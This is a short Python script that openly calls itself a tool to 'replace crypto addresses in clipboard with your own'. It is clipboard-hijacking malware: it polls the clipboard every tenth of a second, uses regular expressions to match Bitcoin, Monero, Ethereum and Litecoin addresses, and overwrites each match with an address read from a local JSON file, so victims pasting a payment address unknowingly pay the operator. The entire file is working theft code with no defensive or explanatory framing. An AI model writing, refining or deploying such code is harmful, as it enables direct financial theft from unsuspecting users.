import pyperclip
import re
import argparse
import json
import time
import sys

parser = argparse.ArgumentParser(
    description="Replace crypto addresses in clipboard with your own")
parser.add_argument("--verbose", help="Get more details", action='store_true')
args = parser.parse_args()

if args.verbose:
    print("Watching Clipboard...")

cryptos = {'legacy_btc': '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',
           'segwit_btc': '^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$',
           'xmr': '4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}',
           'eth': '^0x[a-fA-F0-9]{40}$',
           'lite': '^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$'}

with open('addresses.json') as f:
    addresses = json.load(f)


def check(pasted):
    if len(pasted) > 95:
        return pasted
    try:
        for crypto, crypto_re in cryptos.items():
            if bool(re.search(crypto_re, pasted)):
                if args.verbose:
                    print(f"I have found {crypto}")
                return crypto
        return pasted
    except Exception:
        return pasted


def replace(crypto_type):
    try:
        if crypto_type == 'legacy_btc':
            pyperclip.copy(addresses['legacy_btc'])
        elif crypto_type == 'segwit_btc':
            pyperclip.copy(addresses['segwit_btc'])
        elif crypto_type == 'xmr':
            pyperclip.copy(addresses['xmr'])
        elif crypto_type == 'eth':
            pyperclip.copy(addresses['eth'])
        elif crypto_type == 'lite':
            pyperclip.copy(addresses['lite'])
    except Exception:
        return False


while True:
    try:
        time.sleep(.1)
        current = str(pyperclip.paste())
        replace(check(current))
    except KeyboardInterrupt:
        print("\n Exiting.....")
        sys.exit()
